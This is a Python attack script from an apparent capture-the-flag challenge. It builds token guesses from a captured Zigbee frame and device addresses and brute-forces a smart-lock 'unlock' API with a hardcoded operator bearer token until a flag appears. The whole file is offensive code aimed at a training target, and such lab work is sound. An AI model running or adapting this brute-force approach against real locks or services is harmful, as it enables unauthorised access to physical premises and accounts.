#!/usr/bin/env python3
"""
Strategic Token Generator for Shadow Coordinator CTF
Frame 307 Analysis and Token Generation
"""

import hashlib
import base64
import binascii
import struct
import time
import hmac
import requests
import json

# Frame 307 specific data
FRAME_307_HEX = "41883334120000aa5508000000aa551e34000106000401013318330a00001000b7b8"
FRAME_307_BYTES = bytes.fromhex("41883334120000aa5508000000aa551e34000106000401013318330a00001000b7b8")
DEVICE_NWK = "0x7B9C"
DEVICE_NWK_INT = 0x7B9C
IEEE_ADDRESS = "00:15:8d:00:02:1a:2b:3c"
IEEE_ADDRESS_HEX = "00158d00021a2b3c"
CAPABILITY = 0x8e
SEQUENCE = 51
CLUSTER = 0x0013  # From analysis
TEMPERATURE_RATIO = 0.38
TIMESTAMP = 1778767042.756003000

# API endpoint
API_URL = "http://training-pod2.ctfchile.com:32780/api/v2/services/lock/unlock"
OPERATOR_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvcGVyYXRvciIsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkZhY2lsaXRpZXMgT3BlcmF0b3IiLCJpYXQiOjE3Nzg3NzQ0MjAsImV4cCI6MTc3ODgwMzIyMH0.W0p3F7i98Dxlwar9A1NPR85sLGHd72GuRa88rRtJT34"

def generate_token_candidates():
    """Generate strategic token candidates"""
    candidates = []

    # 1. Frame 307 hex data transformations
    print("=== Frame 307 Based Tokens ===")

    # MD5 of frame data
    frame_md5 = hashlib.md5(FRAME_307_BYTES).hexdigest()
    candidates.append(("frame_md5", frame_md5))

    # SHA256 of frame data
    frame_sha256 = hashlib.sha256(FRAME_307_BYTES).hexdigest()
    candidates.append(("frame_sha256", frame_sha256))

    # Base64 of frame data
    frame_b64 = base64.b64encode(FRAME_307_BYTES).decode()
    candidates.append(("frame_b64", frame_b64))

    # First 16 bytes of frame as hex
    frame_16 = FRAME_307_HEX[:32]
    candidates.append(("frame_16_hex", frame_16))

    # Last 16 bytes of frame as hex
    frame_last16 = FRAME_307_HEX[-32:]
    candidates.append(("frame_last16_hex", frame_last16))

    # 2. Device-specific tokens
    print("=== Device-Specific Tokens ===")

    # IEEE address transformations
    ieee_clean = IEEE_ADDRESS_HEX
    candidates.append(("ieee_hex", ieee_clean))
    candidates.append(("ieee_md5", hashlib.md5(ieee_clean.encode()).hexdigest()))
    candidates.append(("ieee_sha256", hashlib.sha256(ieee_clean.encode()).hexdigest()))

    # NWK address (0x7B9C) transformations
    nwk_hex = hex(DEVICE_NWK_INT)[2:]
    candidates.append(("nwk_hex", nwk_hex))
    candidates.append(("nwk_padded", f"{DEVICE_NWK_INT:08x}"))
    candidates.append(("nwk_reversed", nwk_hex[::-1]))

    # Capability + Sequence combinations
    cap_seq = f"{CAPABILITY:02x}{SEQUENCE:02x}"
    candidates.append(("cap_seq", cap_seq))
    candidates.append(("cap_seq_md5", hashlib.md5(cap_seq.encode()).hexdigest()))

    # Cluster ID variations
    cluster_hex = f"{CLUSTER:04x}"
    candidates.append(("cluster_hex", cluster_hex))
    candidates.append(("cluster_padded", f"{CLUSTER:08x}"))

    # 3. Mathematical patterns
    print("=== Mathematical Pattern Tokens ===")

    # Temperature ratio applied
    ratio_int = int(TEMPERATURE_RATIO * 1000000)  # 380000
    candidates.append(("temp_ratio_int", f"{ratio_int:x}"))
    candidates.append(("temp_ratio_md5", hashlib.md5(str(ratio_int).encode()).hexdigest()))

    # Sequence 51 variations
    seq_variations = [
        f"{SEQUENCE:02x}",
        f"{SEQUENCE:08x}",
        f"{SEQUENCE ** 2:x}",
        f"{SEQUENCE * CAPABILITY:x}"
    ]
    for i, var in enumerate(seq_variations):
        candidates.append((f"seq_var_{i}", var))

    # 4. Timestamp-based tokens
    print("=== Timestamp-Based Tokens ===")

    timestamp_int = int(TIMESTAMP)
    timestamp_ms = int(TIMESTAMP * 1000)

    candidates.append(("timestamp_int", f"{timestamp_int:x}"))
    candidates.append(("timestamp_ms", f"{timestamp_ms:x}"))
    candidates.append(("timestamp_md5", hashlib.md5(str(timestamp_int).encode()).hexdigest()))

    # 5. Combined tokens
    print("=== Combined Tokens ===")

    # IEEE + NWK
    ieee_nwk = ieee_clean + nwk_hex
    candidates.append(("ieee_nwk", ieee_nwk))
    candidates.append(("ieee_nwk_md5", hashlib.md5(ieee_nwk.encode()).hexdigest()))

    # All device identifiers
    device_combo = f"{ieee_clean}{nwk_hex}{cap_seq}{cluster_hex}"
    candidates.append(("device_combo", device_combo))
    candidates.append(("device_combo_md5", hashlib.md5(device_combo.encode()).hexdigest()))
    candidates.append(("device_combo_sha256", hashlib.sha256(device_combo.encode()).hexdigest()))

    # 6. Frame structure based
    print("=== Frame Structure Tokens ===")

    # Source address from frame: 0x55aa
    src_addr = "55aa"
    candidates.append(("src_addr", src_addr))
    candidates.append(("src_addr_md5", hashlib.md5(src_addr.encode()).hexdigest()))

    # PAN ID: 0x1234
    pan_id = "1234"
    candidates.append(("pan_id", pan_id))
    candidates.append(("pan_id_md5", hashlib.md5(pan_id.encode()).hexdigest()))

    # Combined frame identifiers
    frame_combo = f"{src_addr}{pan_id}{nwk_hex}"
    candidates.append(("frame_combo", frame_combo))
    candidates.append(("frame_combo_md5", hashlib.md5(frame_combo.encode()).hexdigest()))

    # 7. HMAC variations (using known data as key)
    print("=== HMAC Tokens ===")

    hmac_key = FRAME_307_BYTES[:16]  # First 16 bytes as key
    hmac_data = ieee_clean.encode()
    hmac_result = hmac.new(hmac_key, hmac_data, hashlib.sha256).hexdigest()
    candidates.append(("hmac_frame_ieee", hmac_result))

    # 8. Special CTF patterns
    print("=== CTF-Specific Tokens ===")

    # Common CTF patterns with our data
    ctf_patterns = [
        f"shadow{nwk_hex}",
        f"coordinator{SEQUENCE}",
        f"lock{cap_seq}",
        f"unlock{ieee_clean[:8]}",
        f"zigbee{cluster_hex}",
        f"frame307{src_addr}"
    ]

    for pattern in ctf_patterns:
        candidates.append((f"ctf_{pattern}", pattern))
        candidates.append((f"ctf_{pattern}_md5", hashlib.md5(pattern.encode()).hexdigest()))

    return candidates

def test_token(token, description=""):
    """Test a token against the API"""
    headers = {
        'Authorization': f'Bearer {OPERATOR_TOKEN}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (compatible; TokenTester/1.0)'
    }

    data = {
        "token": token
    }

    try:
        response = requests.post(API_URL, headers=headers, json=data, timeout=10)
        print(f"[{response.status_code}] {description}: {token[:50]}{'...' if len(token) > 50 else ''}")

        if response.status_code == 200:
            try:
                result = response.json()
                if 'flag' in str(result).lower():
                    print(f"🎉 SUCCESS! Token found: {token}")
                    print(f"🚩 Response: {result}")
                    return True
            except:
                print(f"    Response text: {response.text}")
                if 'flag' in response.text.lower():
                    print(f"🎉 SUCCESS! Token found: {token}")
                    return True

        elif response.status_code != 401 and response.status_code != 403:
            print(f"    Unexpected response: {response.text}")

    except Exception as e:
        print(f"    Error testing token: {e}")

    return False

def main():
    print("=== Shadow Coordinator Token Generator ===")
    print(f"Target: {API_URL}")
    print(f"Frame 307 data: {len(FRAME_307_BYTES)} bytes")
    print(f"Device NWK: {DEVICE_NWK}")
    print(f"IEEE Address: {IEEE_ADDRESS}")
    print("=" * 60)

    # Generate all token candidates
    candidates = generate_token_candidates()

    print(f"\n=== Testing {len(candidates)} Token Candidates ===")

    # Test each candidate
    success = False
    for desc, token in candidates:
        if test_token(token, desc):
            success = True
            break
        time.sleep(0.1)  # Small delay to avoid rate limiting

    if not success:
        print("\n❌ No working token found in initial candidates")
        print("\n=== Additional Strategic Candidates ===")

        # Generate some additional complex candidates
        additional = []

        # XOR patterns
        ieee_bytes = bytes.fromhex(IEEE_ADDRESS_HEX)
        nwk_bytes = struct.pack('>H', DEVICE_NWK_INT)

        # XOR IEEE with NWK repeated
        xor_result = bytes(a ^ b for a, b in zip(ieee_bytes, (nwk_bytes * 4)[:len(ieee_bytes)]))
        additional.append(("xor_ieee_nwk", xor_result.hex()))

        # Frame data XOR with device identifiers
        device_bytes = ieee_bytes + nwk_bytes
        frame_xor = bytes(a ^ b for a, b in zip(FRAME_307_BYTES[:len(device_bytes)], device_bytes))
        additional.append(("frame_xor_device", frame_xor.hex()))

        # Test additional candidates
        for desc, token in additional:
            if test_token(token, desc):
                success = True
                break
            time.sleep(0.1)

    if not success:
        print("\n❌ No working token found. Consider manual analysis of:")
        print(f"   - Frame 307 hex: {FRAME_307_HEX}")
        print(f"   - IEEE address: {IEEE_ADDRESS_HEX}")
        print(f"   - NWK address: {hex(DEVICE_NWK_INT)}")
        print(f"   - Sequence: {SEQUENCE}")
        print(f"   - Capability: {hex(CAPABILITY)}")

if __name__ == "__main__":
    main()